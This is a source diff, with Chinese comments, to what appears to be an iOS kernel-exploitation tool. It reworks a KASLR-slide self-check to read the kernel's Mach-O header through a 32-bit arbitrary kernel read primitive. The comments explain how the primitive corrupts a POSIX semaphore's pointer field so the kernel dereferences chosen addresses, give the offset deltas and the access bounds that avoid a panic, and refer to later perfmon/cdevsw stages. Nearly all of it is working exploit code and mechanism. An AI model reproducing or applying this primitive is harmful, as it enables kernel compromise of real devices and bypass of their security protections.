@@ -22,7 +22,8 @@
 //  本文件逐行对照它实现，只换掉两处**来源**：
 //    · dynamic_info(kernelcache__vn_kqfilter) → XPF 的 kernelSymbol.vn_kqfilter
 //      （dynamic_info.h 里 kernelcache__* 整列为 0，那条来源已经不存在）；
-//    · kread(kfd, …) → KernelMemory.h 的 km_read / km_read64。
+//    · kread(kfd, …) → KernelMemory.h 的 km_read / km_read64，以及 ⑤ 自检专用的
+//      km_read_u32（**页首只能走这一条**，理由见 slide_verify_kernel_base）。
 //
 //  刻意**不**做的事（不是遗漏，是止损纪律）：
 //    perf_run 的剩余部分 —— /dev/aes_0 的 si_rdev 改写成 perfmon、遍历 cdevsw、
@@ -143,22 +144,31 @@
 /*
  * kernelcache 头两个 32 位字：MH_MAGIC_64 与 cputype（CPU_TYPE_ARM64|ABI64）。
  *
- * **这两个常量目前没有读取点，但不要删**（2026-09-26）：它们在 kernel_base 的
- * 第 0 个 8 字节处，而 kernel_base 是 16 KB 对齐页首、页内偏移恒为 0 ——
- * 底层 kread 会把指针改写成 `addr − 0x0C` 再让内核解引用，偏移 0 落到前一页
- * 就是整机 panic，于是页闸门必然拒掉这个读（详见 slide_verify_kernel_base 里
- * 那段注释）。所以自检改用页内 0x10 的 ncmds/sizeofcmds，这两个字读不到。
+ * **这两个常量现在有读取点了**：自检回到上游 perf.h:112-118 的强判据 ——
+ * kernel_base 页首的两个字必须分别是 magic 与 cputype（逐条对照见下面 ⑤ 那段注释）。
  *
- * 留着它们的理由：它们是"这个地址处到底是什么"的**定义**，将来若有一条能安全
- * 读页首的路径（例如另一个读取后端把下溢量降到 0），自检应当回到这个更强的判据。
+ * 以前它们没有读取点，原因是一条**硬约束**而不是嫌麻烦：那时只有 64 位读路径可用，
+ * 它的 delta 是 0x0C、最低的源访问地址是 addr − 0x08，而 kernel_base 是 16 KB 对齐
+ * 页首（页内偏移恒为 0）—— 那个减法落到前一页，页闸门必然拒掉这个读，
+ * 于是自检只能退化到页内 0x10 的 ncmds/sizeofcmds（增量式字段，判据弱得多）。
+ *
+ * 现在多了一条**真的 32 位路径**（KernelMemory 的 km_read_u32，delta = 0x04）：它的
+ * 源访问从 addr 本身开始，页首可读，所以页首这两个字读得到。两条路径的分工是硬的、
+ * 不许互换：**页首只能用 32 位路径**，64 位路径读页首会读前一页 → 整机 panic。
  */
 #define KM_SLIDE_MH_MAGIC   0xfeedfacfU
 #define KM_SLIDE_MH_CPUTYPE 0x0100000cU
+/* cputype 在 mach_header_64 里的偏移（magic@0x00 cputype@0x04）。 */
+#define KM_SLIDE_MH_CPUTYPE_OFF 0x04U
 
-/* 自检的页内锚点：ncmds@0x10 / sizeofcmds@0x14。为什么是 0x10 见上面那条注释。 */
-#define KM_SLIDE_HEAD_AUX_OFF 0x10U
-/* ncmds 的合理上界。真实内核是几百条，给足余量后仍能挡住"随机数据凑巧通过"。 */
-#define KM_SLIDE_NCMDS_MAX 4096U
+/*
+ * 32 位读路径的源访问包络长度：整段 [addr, addr + 本值) 必须落在一页之内。
+ *
+ * 与 KernelMemory.m 的 KM_READ32_SOURCE_SPAN 是**同一个数**，这里必须再写一遍：
+ * 那个宏在 KernelMemory 的实现文件里，刻意不导出 —— 导出它等于把"这个包络怎么算出
+ * 来的"变成一个跨文件的隐式约定。诊断里会把这个数打出来，两边一旦不一致能看出来。
+ */
+#define KM_SLIDE_READ32_SOURCE_SPAN 0x30U
 
 /*
  * 自己 open 出来的 fd 必然是小的整数（进程的 ofiles 数组长度在几百量级）。
@@ -472,6 +482,56 @@ static bool slide_read_bulk(km_slide_text *t, uint64_t addr, void *out, size_t l
 }
 
 /*
+ * 读一个 32 位字，走 km_read_u32 的**32 位路径**（delta = 0x04）。
+ *
+ * 为什么自检只能用它、不能用 km_read / km_read64：kernel_base 是 16 KB 对齐的
+ * **页首**（页内偏移恒为 0），而 64 位路径的源访问最低到 addr − 0x08 —— 那个减法
+ * 落到前一页，前一页未映射就是整机 panic。32 位路径的源访问从 addr 本身开始，
+ * 页首可读。两条路径的机制见 KernelMemory.m 的 KM_READ32_SOURCE_SPAN，判据的
+ * 来历见下面 ⑤ 那段注释。
+ *
+ * 失败必须能分辨是几种里的哪一种（与 slide_read_bulk 同一条纪律 —— 它注释里记着的
+ * 那句「形态检查未过 或 kread 失败」正是反面教材）：
+ *   · 形态不过          → 一次 kread 都没发；
+ *   · 页闸门拒（包络出页）→ 一次 kread 都没发，**这一条能从打印出来的页内偏移自己判出来**；
+ *   · 后端不是 sem_open  → 一次 kread 都没发，页内偏移够用却被拒时就是它。
+ * 所以文案不合并成一句含糊的话：页内偏移与包络长度都打出来，几种原因各自可判。
+ *
+ * `km_read_u32` 的返回值只表示「读发出去了没」——不表示内核真的读到了那个地址，
+ * 更不表示读到的值正确（单次读，没有复读一致那种校验）。这个区别写在
+ * KernelMemory.h 的 km_read_u32 注释里，这里不重复。
+ */
+static bool slide_read_u32(km_slide_text *t, uint64_t addr, uint32_t *out, const char *what)
+{
+    if (!out) return false;
+
+    if (!km_slide_kernel_ptr(addr)) {
+        text_append(t, "  [u32] %s：形态不过，%#llx 不是合法内核指针（未发出 kread）\n",
+                    what, (unsigned long long)addr);
+        return false;
+    }
+
+    bool sent = false;
+    if (!km_read_u32(addr, out, &sent)) {
+        const uint64_t pageOff = addr & 0x3fffULL;
+        text_append(t, "  [u32] %s：形态过、但一次 kread 都没发：%#llx"
+                       "（页内偏移 %#llx，源包络 %#llx）——\n"
+                       "    页内偏移 + 包络 > 0x4000 就是被页闸门按「源访问出页」拒的；\n"
+                       "    页内偏移够用却仍然没发，则剩下的只有一种可能：当前读后端不是 kread_sem_open"
+                       "（形态与 4 字节对齐都已排除；句柄为空的情形在调用链更上游就被拒了）。\n",
+                    what, (unsigned long long)addr, (unsigned long long)pageOff,
+                    (unsigned long long)KM_SLIDE_READ32_SOURCE_SPAN);
+        return false;
+    }
+    /*
+     * 走到这里 `sent` 必然是 true（km_read_u32 的「返回 true」与「*ok 置 true」是同一件事），
+     * 但仍然把它返回来 —— 这样「这一次读没发出去就不算成功」这条约束落在数据上，
+     * 而不是落在"我知道它一定为真"上；也免得日后有人以为返回值与 *ok 可能不一致。
+     */
+    return sent;
+}
+
+/*
  * 读一个「本应是内核指针」的字段：地址过形态检查 → 读 → 值再过一次形态检查。
  * 链条上每一步都是它，所以失败文案才能统一成「哪一步 + 地址 + 读到的值」三件套。
  *
@@ -552,12 +612,14 @@ typedef struct {
     uint64_t slide;
     uint64_t kernelBase;
     /*
-     * 自检实际读到的头字段（只进诊断）。之所以记这两个而不是 magic/cputype：
-     * kernel_base 是页首、读不了（见 slide_verify_kernel_base 那段长注释），
-     * 自检只能从页内 0x10 的 ncmds/sizeofcmds 下手。
+     * 自检实际读到的头两个字：页首的 magic 与紧随其后的 cputype。
+     * 它们只进诊断（面板上的那两个数由 text_append 打出来；这里留存是为了让 run
+     * 结构自身带上"自检采信了什么"）。能读到它们的前提是**走 32 位路径** ——
+     * kernel_base 是页首，64 位路径的源访问会踩前一页（见 slide_verify_kernel_base
+     * 那段长注释）。
      */
-    uint32_t headNcmds;
-    uint32_t headSizeofcmds;
+    uint32_t headMagic;
+    uint32_t headCputype;
     km_slide_ptov_entry ptov[KM_SLIDE_PTOV_COUNT];
     bool     ptovTrusted;     /* ⑥ 的三道判据（整表形态 + ① 偏移恒定 + ② va 值域）
                                * 是否全过 —— 只有它为真，提交出去的表才参与查表。
@@ -1049,14 +1111,46 @@ static bool slide_resolve_fo_kqfilter(km_slide_run *run, km_slide_text *t)
  *     kernel_base = 链接基址 + slide           （上游写的是 ARM64_LINK_ADDR + slide）
  *     kernel_base 处的两个 32 位字必须是 MH_MAGIC_64 与 cputype(=arm64|ABI64)
  *
- * 为什么这条能证明 slide 对：slide 是「运行时 vn_kqfilter − 链接期 vn_kqfilter」，
- * 两边任一处错，得到的都是一个随机数；随机 slide 加在链接基址上，恰好落在一段以
- * 这两个字开头（且相邻两个字都对）的内核数据上的概率是 2^-64 量级。
+ * ── 这两个字为什么只能走 32 位路径（本次改动的核心，别简化）──
  *
- * 但这条判据有它自己**挡不住**的一类错：基址本身错。上游那一行抄的是一个构建期
- * 派生的常量（static_info.h:12），它在本类机型上偏了整 2 TB —— 那时无论 candidate
- * 对不对，待读地址都落在未映射区，而 kread 是让内核去解引用它：内核态 data abort、
- * 整机重启（设备上实测的彩屏）。所以本函数里读之前有两道额外纪律：
+ * 判据落在 **kernel_base 页首**，而底层读原语不是"直接读那个地址"：它把一个本进程
+ * 持有的内核对象的**指针字段**改写成 `目标地址 − delta`，再让内核按内核语义从那个
+ * 指针开始逐字段解引用。于是内核实际碰到的最低地址是 `addr − delta`（那个值落在未
+ * 映射页上时，内核在 same-EL data abort 下没有恢复路径 → **整机 panic**），
+ * 而两条路径的 delta 不同：
+ *
+ *   64 位路径（kread_sem_open.h:147）`kaddr - offsetof(struct pseminfo, psem_uid)`
+ *        ⇒ delta = 0x0C ⇒ 最低源访问地址 = addr − 0x08（psem_usecount 在 pinfo + 0x04）
+ *        ⇒ **addr 是页首（页内偏移 0）时那次访问落到前一页** → 整机 panic
+ *   32 位路径（kread_sem_open.h:175）`kaddr - offsetof(struct pseminfo, psem_usecount)`
+ *        ⇒ delta = 0x04 ⇒ 最低源访问地址 = addr
+ *        ⇒ **一格都不碰 addr 之前的字节，页首可读**
+ *
+ * 32 位那条之所以彻底安全，还有一个独立事实撑着：公开 XNU 的 fill_pseminfo()
+ * （bsd/kern/posix_sem.c）**不读 `pinfo + 0`** —— 第一个字段 psem_flags 的检查被
+ * `#if 0` 关掉，它逐字段读，最低的源访问地址是 pinfo + 0x04。
+ * 上界同样是确定的：psem_name[32] 在 pseminfo 偏移 0x14（static_info.h:556-567），
+ * 内核要填满它就必须读到 pinfo + 0x34 = addr + 0x30，所以 32 位路径的源访问包络是
+ * [addr, addr + 0x30)。
+ *
+ * 顺带把一个容易搞反的点钉在这里：返回结构里 vst_size 位于 psem_fdinfo + 0x70
+ * **与源地址无关** —— 那条赋值是 `sb->vst_size = pinfo->psem_usecount;`，源是
+ * pinfo + 0x04 = addr，目标才是返回结构的 0x70。delta 是 0x04，**不是 0x70**。
+ *
+ * 所以本函数的读**只能**经 km_read_u32（KernelMemory.h / .m），不能经 km_read 或
+ * km_read64：后两者在页首会踩前一页。这条分工是硬的 —— 谁把这里改回 km_read，
+ * 谁就把一次彩屏换回来。
+ *
+ * ── 这条自检能证明什么、**不能**证明什么 ──
+ *
+ * 能证明：slide 对。slide 是「运行时 vn_kqfilter − 链接期 vn_kqfilter」，两边任一处
+ * 错，得到的都是一个随机数；随机 slide 加在链接基址上，恰好落在一段以这两个字开头
+ * （且相邻两个字都对）的内核数据上的概率是 2^-64 量级。
+ *
+ * **不能证明：候选基址是否正确。** 自检查的是「链接基址 + candidate」这个**拼出来的
+ * 地址**处是不是 Mach-O 头，它回答不了「那个地址是否已映射」—— 候选页未映射时那次读
+ * 照样让内核在未映射页上 data abort：**自检过程本身仍然会 panic，自检通过也不等于
+ * 基址对。** 这正是本函数里读之前那两道纪律存在的理由（不是形式主义）：
  *   ① 先把此刻的全部数值落盘（那次读若出事，内存里的诊断会随重启一起没）；
  *   ② 再过 slide_candidate_fits_image 的纯算术约束：不通过就一次读都不发
  *      （基址取错域时它直接失败，而那正是最该留下现场的一类）。
@@ -1067,7 +1161,8 @@ static bool slide_resolve_fo_kqfilter(km_slide_run *run, km_slide_text *t)
  *
  * 失败时把**算出来的 slide、kernel_base、实际读到的两个字**都写进诊断 ——
  * 那是唯一能反推"是 slide 错还是读错"的证据（而基址来源会写在 ④ 与自检之间的
- * link_const / link_xpf 两行里）。
+ * link_const / link_xpf 两行里）。三种结果各有各的文案：读到但不对 / 读不到
+ * （页闸门拒或底层的读没发出去）/ 通过。
  */
 static bool slide_verify_kernel_base(km_slide_run *run, uint64_t candidate, km_slide_text *t)
 {
@@ -1118,63 +1213,72 @@ static bool slide_verify_kernel_base(km_slide_run *run, uint64_t candidate, km_s
     }
 
     /*
-     * ── 自检锚点必须落在页内偏移 >= 0x0C 处（2026-09-26 重写，原实现必然失败）──
+     * ── 判据：页首的两个 32 位字（上游 perf.h:112-118），**走 32 位路径** ──
      *
-     * 原实现读 `kernel_base + 0` 处的 `mach_header_64`，而 kernel_base 是 **16 KB
-     * 对齐的页首**，页内偏移恒为 0。底层 kread 把指针改写成 `addr − 0x0C` 再让内核
-     * 解引用，偏移 0 会落到前一页 → 整机 panic，所以 `km_read` 的页闸门要求偏移
-     * >= 0x0C 并**必然拒绝**这个读。真机症状就是那句
-     * 「kernel_base=0xfffffe0011598000 读不到（形态检查未过或 kread 失败）」——
-     * 而它什么都没证明：那次读根本没发出去。**自检失败 ≠ slide 错。**
+     *     mach_header_64:  magic@0x00 cputype@0x04
      *
-     * 所以判据从「页首的 magic/cputype」换成「页内 0x10 起的头字段」：
-     *     mach_header_64:  magic@0x00 cputype@0x04 cpusubtype@0x08
-     *                      filetype@0x0C ncmds@0x10 sizeofcmds@0x14 flags@0x18
-     * kread 的粒度是 4 或 8 字节，所以页内偏移必须是 4 的倍数，而 >= 0x0C 的最小
-     * 4 字节对齐位置就是 **0x10**（= ncmds）。读它 + 0x14 的 sizeofcmds，一次 8 字节。
+     * 为什么分两次 4 字节读、而不是一次 8 字节：64 位路径读页首会踩前一页（机制见上面
+     * 那段长注释），而 32 位路径本来就是 4 字节粒度 —— 它只有 u32 这一种形态。
+     * 两次读的地址（kernel_base 与其 +0x04）都在页首那一页内，页内偏移分别是 0 与 4。
      *
-     * 判据强度如实说清：这两个是**增量式 32 位字段**，不像 magic 那样是精确常量，
-     * 所以这条自检比原设计的**弱**。它挡得住"随机 slide 落在一段无关数据上"
-     * （ncmds 与 sizeofcmds 同时落在有效区间的概率极低），挡不住刻意构造的数据。
-     * 换来的是一件事：**这次读真的会发出去**，因此它的成败才是一条关于地址的观察，
-     * 而不是关于我们自己闸门的观察。这个取舍写在 KernelSlide.h 里。
+     * 一次判定：读不到就如实报读不到，读到不对就如实报读到了什么。**不重试、不换地址
+     * 再试** —— 换地址试就是在一个未经判定结果支撑的地址上再发一次 kread。
      */
-    uint64_t aux = 0;
-    if (!slide_read_bulk(t, run->kernelBase + KM_SLIDE_HEAD_AUX_OFF, &aux, sizeof(aux))) {
-        /* 具体是形态不过还是 kread 被拒，由 slide_read_bulk 自己那两行说明（见它）。 */
-        text_append(t, "  kernel_base+%#x=%#llx 读不到 —— 原因见上面那一行 [bulk]\n",
-                    (unsigned)KM_SLIDE_HEAD_AUX_OFF,
-                    (unsigned long long)(run->kernelBase + KM_SLIDE_HEAD_AUX_OFF));
-        return slide_refuse(run, t, "⑤ 自检", "读不到 kernel_base 头部的 ncmds/sizeofcmds");
+    text_append(t, "⑤ 自检判据：读页首两个字（32 位路径）—— %#llx 处的 magic，"
+                   "%#llx 处的 cputype\n",
+                (unsigned long long)run->kernelBase,
+                (unsigned long long)(run->kernelBase + KM_SLIDE_MH_CPUTYPE_OFF));
+
+    uint32_t magic = 0;
+    if (!slide_read_u32(t, run->kernelBase, &magic, "mh_header[0] (magic)")) {
+        /* 具体是形态不过、页闸门拒，还是后端不对，由 slide_read_u32 那几行说明（见它）。 */
+        text_append(t, "  kernel_base=%#llx 页首的 magic 读不到 —— 原因见上面那行 [u32]；"
+                       "这一轮没有第二个字可读，也不换地址重试\n",
+                    (unsigned long long)run->kernelBase);
+        return slide_refuse(run, t, "⑤ 自检", "读不到 kernel_base 页首的 magic（未发出 kread）");
     }
 
-    const uint32_t ncmds = (uint32_t)(aux & 0xFFFFFFFFu);
-    const uint32_t sizeofcmds = (uint32_t)(aux >> 32);
-    /* sizeofcmds 至少要放得下 ncmds 条最小 load command（每条 8 字节头）。 */
-    const bool plausible = (ncmds > 0) && (ncmds <= (uint32_t)KM_SLIDE_NCMDS_MAX) &&
-                           (sizeofcmds >= ncmds * 8u) && (sizeofcmds <= (16u << 20));
-    if (!plausible) {
-        text_append(t, "  自检不通过：slide=%#llx kernel_base=%#llx "
-                       "头部 +%#x 读到 ncmds=%u sizeofcmds=%u（不像一个 Mach-O 头）\n",
+    uint32_t cputype = 0;
+    if (!slide_read_u32(t, run->kernelBase + KM_SLIDE_MH_CPUTYPE_OFF, &cputype,
+                        "mh_header[1] (cputype)")) {
+        text_append(t, "  kernel_base+%#x=%#llx 处的 cputype 读不到（magic 已读到 %#llx）"
+                       " —— 原因见上面那行 [u32]\n",
+                    (unsigned)KM_SLIDE_MH_CPUTYPE_OFF,
+                    (unsigned long long)(run->kernelBase + KM_SLIDE_MH_CPUTYPE_OFF),
+                    (unsigned long long)magic);
+        return slide_refuse(run, t, "⑤ 自检", "读不到 kernel_base+4 处的 cputype（未发出 kread）");
+    }
+
+    if (magic != KM_SLIDE_MH_MAGIC || cputype != KM_SLIDE_MH_CPUTYPE) {
+        /*
+         * 「读到值」不等于「那个地址映射着有效数据」：读失败时 kread 会落在悬空 PTE
+         * 对应的垃圾上（这一点 km_read64 的注释里写着），所以这一支必须把**实际读到的
+         * 两个数**打出来，而不是只说"不对"。
+         */
+        text_append(t, "  自检不通过：slide=%#llx kernel_base=%#llx 页首读到 "
+                       "magic=%#llx（期望 %#llx）、cputype=%#llx（期望 %#llx）——\n"
+                       "    两个字都读到了但不对：该地址处不是 mach_header_64。\n",
                     (unsigned long long)candidate,
                     (unsigned long long)run->kernelBase,
-                    (unsigned)KM_SLIDE_HEAD_AUX_OFF,
-                    (unsigned)ncmds, (unsigned)sizeofcmds);
-        return slide_refuse(run, t, "⑤ 自检", "kernel_base 头部字段不像 mach_header_64");
+                    (unsigned long long)magic,
+                    (unsigned long long)KM_SLIDE_MH_MAGIC,
+                    (unsigned long long)cputype,
+                    (unsigned long long)KM_SLIDE_MH_CPUTYPE);
+        return slide_refuse(run, t, "⑤ 自检", "kernel_base 页首不是 MH_MAGIC_64 / cputype");
     }
 
     /*
      * 这里打印 candidate 而不是 run->slide：run->slide 要到本函数返回之后才赋值，
      * 用它会把这行诊断打成 slide=0（值本身没错，显示错的诊断比没有更差）。
      */
-    run->headNcmds = ncmds;
-    run->headSizeofcmds = sizeofcmds;
-    text_append(t, "⑤ 自检通过：slide=%#llx kernel_base=%#llx "
-                   "头部 +%#x = ncmds %u / sizeofcmds %u\n",
+    run->headMagic = magic;
+    run->headCputype = cputype;
+    text_append(t, "⑤ 自检通过：slide=%#llx kernel_base=%#llx 页首两字 "
+                   "magic=%#llx cputype=%#llx（= MH_MAGIC_64 / arm64|ABI64）\n",
                 (unsigned long long)candidate,
                 (unsigned long long)run->kernelBase,
-                (unsigned)KM_SLIDE_HEAD_AUX_OFF,
-                (unsigned)ncmds, (unsigned)sizeofcmds);
+                (unsigned long long)magic,
+                (unsigned long long)cputype);
     return true;
 }
 
